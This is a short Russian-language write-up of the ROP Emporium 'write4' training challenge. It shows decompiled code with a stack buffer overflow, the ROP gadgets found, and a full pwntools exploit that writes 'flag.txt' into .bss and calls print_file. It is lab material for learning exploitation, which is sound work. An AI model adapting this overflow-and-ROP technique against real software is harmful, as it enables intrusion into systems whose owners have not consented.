Архив с задачей: https://ropemporium.com/binary/write4.zip

Исходный код `write4` (elf):
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  pwnme(argc, argv, envp);
}

// attributes: thunk
__int64 __fastcall pwnme(__int64 a1, __int64 a2, __int64 a3)
{
  return pwnme(a1, a2, a3);
}

__int64 usefulFunction()
{
  return print_file("nonexistent");
}
```

Гаджеты:
```
0x0000000000400693 : pop rdi ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400628 : mov [r14], r15 ; ret
```

Другие важные ссылки:
```
0x0000000000400620 : call _print_file
```

Исходный код `libwrite4.so`:
``` C
void pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(stdout, nullptr, 2, 0);
  puts("write4 by ROP Emporium");
  puts("x86_64\n");
  memset(s, 0, sizeof(s));
  puts("Go ahead and give me the input already!\n");
  printf("> ");
  read(0, s, 0x200u);
  puts("Thank you!");
}
```

Для получения флага надо вызвать `print_file("flag.txt")`, т.к. строка `flag.txt` отсутствует в файле, то сначала надо записать её в секцию с правами `WR`, сюда подходит `.bss`:

Запись можно осуществить при помощи гаджета `mov [r14], r15`. После записи `flag.txt` в память можно вызвать функцию `print_file` и передать туда адрес секции `.bss`.

Эксплоит:
``` python
pop_r14_pop_r15 = 0x400690
bss = 0x601038
flag_txt_text = 0x7478742e67616c66
mov_r14_r15 = 0x400628
pop_rdi = 0x400693
call_print_file = 0x400620

io = start()

payload = b'A' * (32 + 8)
payload += p64(pop_r14_pop_r15) + p64(bss) + p64(flag_txt_text)
payload += p64(mov_r14_r15) # [data_section] = "flag.txt"
payload += p64(pop_rdi) + p64(bss)
payload += p64(call_print_file)
io.sendline(payload)

io.interactive()
```
